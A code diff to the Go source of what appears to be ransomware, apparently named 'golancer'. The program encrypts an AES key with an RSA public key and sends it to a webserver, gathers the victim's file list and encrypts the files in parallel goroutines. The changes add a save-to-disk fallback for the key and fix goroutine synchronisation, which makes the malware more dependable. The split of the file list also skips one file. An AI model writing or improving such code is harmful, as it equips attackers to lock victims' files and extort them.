@@ -4,6 +4,7 @@ import (
 	"crypto/rsa"
 	"flag"
 	"fmt"
+	"log"
 	"os"
 	"runtime"
 	"sync"
@@ -47,7 +48,12 @@ func main() {
 		aesKey = cryptutil.GenerateAES()
 
 		fmt.Println("Encrypting AES key and sending to webserver.")
-		webhelper.SendKey(cryptutil.EncryptAESKey(aesKey, publicKey), addr)
+		err := webhelper.SendKey(cryptutil.EncryptAESKey(aesKey, publicKey), addr)
+		if err != nil {
+			log.Println(err)
+			fmt.Println("Error sending key to webserver. Saving key to disk.")
+			cryptutil.SaveAESKey(cryptutil.EncryptAESKey(aesKey, publicKey), "golancer-e.key")
+		}
 
 		fmt.Println("Gathering file list.")
 		fileList = sysinfo.GetFileList()
@@ -144,10 +150,14 @@ func startEncryptors(decrypt bool) {
 		} else {
 			blockSize := len / 2
 			if decrypt {
+				wg.Add(1)
 				go decryptFiles(fileList[:blockSize])
+				wg.Add(1)
 				go decryptFiles(fileList[blockSize+1 : len])
 			} else {
+				wg.Add(1)
 				go encryptFiles(fileList[:blockSize])
+				wg.Add(1)
 				go encryptFiles(fileList[blockSize+1 : len])
 			}
 			wg.Wait()
